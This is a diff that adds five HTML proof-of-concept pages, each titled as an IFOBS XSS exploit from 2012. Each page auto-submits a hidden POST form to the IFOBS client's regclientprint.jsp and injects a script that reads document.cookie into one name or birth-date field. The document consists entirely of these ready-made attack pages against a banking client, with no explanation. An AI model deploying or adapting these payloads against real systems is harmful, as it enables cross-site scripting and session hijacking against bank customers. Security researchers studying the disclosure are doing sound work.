@@ -1,0 +1,87 @@
+IFOBS XSS-1.html
+
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;IFOBS XSS exploit (C) 2012 MustLive.
+http://websecurity.com.ua&lt;/title&gt;
+&lt;/head&gt;
+&lt;body onLoad=&quot;document.hack.submit()&quot;&gt;
+&lt;form name=&quot;hack&quot; action=&quot;http://site/ifobsClient/regclientprint.jsp&quot;;
+method=&quot;post&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;secondName&quot;
+value=&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;myaction&quot; value=&quot;1&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+IFOBS XSS-2.html
+
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;IFOBS XSS exploit (C) 2012 MustLive.
+http://websecurity.com.ua&lt;/title&gt;
+&lt;/head&gt;
+&lt;body onLoad=&quot;document.hack.submit()&quot;&gt;
+&lt;form name=&quot;hack&quot; action=&quot;http://site/ifobsClient/regclientprint.jsp&quot;;
+method=&quot;post&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;firstName&quot;
+value=&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;myaction&quot; value=&quot;1&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+IFOBS XSS-3.html
+
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;IFOBS XSS exploit (C) 2012 MustLive.
+http://websecurity.com.ua&lt;/title&gt;
+&lt;/head&gt;
+&lt;body onLoad=&quot;document.hack.submit()&quot;&gt;
+&lt;form name=&quot;hack&quot; action=&quot;http://site/ifobsClient/regclientprint.jsp&quot;;
+method=&quot;post&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;thirdName&quot;
+value=&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;myaction&quot; value=&quot;1&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+IFOBS XSS-4.html
+
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;IFOBS XSS exploit (C) 2012 MustLive.
+http://websecurity.com.ua&lt;/title&gt;
+&lt;/head&gt;
+&lt;body onLoad=&quot;document.hack.submit()&quot;&gt;
+&lt;form name=&quot;hack&quot; action=&quot;http://site/ifobsClient/regclientprint.jsp&quot;;
+method=&quot;post&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;BirthDay&quot;
+value=&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;BirthYear&quot; value=&quot;2012&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;myaction&quot; value=&quot;1&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+IFOBS XSS-5.html
+
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;IFOBS XSS exploit (C) 2012 MustLive.
+http://websecurity.com.ua&lt;/title&gt;
+&lt;/head&gt;
+&lt;body onLoad=&quot;document.hack.submit()&quot;&gt;
+&lt;form name=&quot;hack&quot; action=&quot;http://site/ifobsClient/regclientprint.jsp&quot;;
+method=&quot;post&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;BirthMonth&quot;
+value=&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;BirthYear&quot; value=&quot;2012&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;myaction&quot; value=&quot;1&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
